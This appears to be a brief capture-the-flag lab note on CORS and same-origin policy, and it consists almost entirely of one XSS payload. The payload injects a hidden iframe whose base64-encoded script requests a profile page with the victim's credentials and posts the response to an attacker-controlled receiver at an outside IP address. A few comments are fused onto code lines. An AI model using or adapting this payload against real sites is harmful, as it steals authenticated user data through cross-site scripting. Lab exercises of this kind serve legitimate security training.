# **CORS & SOP**

# **Vulnerable XSS**

Payload:

```
<iframe id="exploitFrame" style="display:none;"></iframe><textarea id="load" style="width: 1183px; height: 305px;"></textarea><script>
    // JavaScript code for the exploit, adapted for inclusion in a data URLvar exploitCode = `
      <script>
        function exploit() {
          var xhttp = new XMLHttpRequest();
          xhttp.open("GET", "http://login.worldwap.thm/profile.php", true);
          xhttp.withCredentials = true;
          xhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
              // Assuming you want to exfiltrate data to a controlled server
              var exfiltrate = function(data) {
                var xhr = new XMLHttpRequest();
                xhr.open("POST", "http://192.168.140.170/receiver.php", true);
                xhr.withCredentials = true;
                var body = data;
                var aBody = new Uint8Array(body.length);
                for (var i = 0; i < aBody.length; i++)
                  aBody[i] = body.charCodeAt(i);
                xhr.send(new Blob([aBody]));
              };
              exfiltrate(this.responseText);
            }
          };
          xhttp.send();
        }
        exploit();
      <\/script>
    `;// Encode the exploit code for use in a data URLvar encodedExploit = btoa(exploitCode);// Set the iframe's src to the data URL containing the exploit
    document.getElementById('exploitFrame').src = 'data:text/html;base64,' + encodedExploit;</script>
```
